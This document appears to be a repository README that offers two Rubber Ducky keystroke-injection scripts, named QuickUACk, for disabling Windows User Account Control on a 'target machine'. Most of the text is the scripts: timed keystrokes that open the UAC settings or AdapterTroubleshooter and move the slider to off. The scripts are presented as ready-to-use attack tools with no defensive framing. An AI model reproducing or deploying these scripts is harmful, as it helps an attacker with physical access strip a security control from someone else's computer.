# QuickUACk!
Some of my antiUAC Scripts for Rubbber Ducky

A pair of fast solutions to disable UAC (User Account Control) 
</BR>
it works on all windows version 32 and 64 bits with uac (Vista or Earlier) 
</BR>
and are valid for all languages (Latin, of course).
</BR>

The scripts were created with the Italian keyboard, 
</BR>
so I do not exclude that in some cases they require minor adjustments.
</BR>
if the target machine is old, I recommend extending the delay time.


![alt text](https://media1.giphy.com/media/aQrYT4WVN55aU/giphy.gif)


</BR>

QuickUACk Ver. 1.0

DELAY 2000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
REM start C:\Windows\System32\AdapterTroubleshooter.exe
</BR>
REM work on all windows version 32 and 64 bit
</BR>
REM no reboot is required for disabling 
</BR>
STRING AdapterTroubleshooter
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER
</BR>

-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-



QuickUACk Ver. 2.0

DELAY 2000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
REM opens directly the User Account Control Panel 
</BR>
REM work on all windows version 32 and 64 bit with uac (Vista or Earlier)
</BR>
REM no reboot is required for disabling
</BR>
STRING UAC
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DOWNARROW
</BR>
DELAY 200
</BR>
TAB
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
LEFTARROW
</BR>
DELAY 200
</BR>
ENTER
